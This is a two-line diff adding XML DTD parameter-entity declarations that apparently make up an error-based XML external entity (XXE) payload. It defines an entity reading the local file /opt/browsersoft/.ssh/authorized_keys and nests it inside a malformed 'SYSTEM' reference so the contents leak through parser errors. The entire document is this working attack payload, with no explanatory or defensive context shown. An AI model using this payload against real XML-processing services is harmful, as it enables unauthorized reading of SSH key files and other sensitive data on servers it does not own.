@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/.ssh/authorized_keys">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
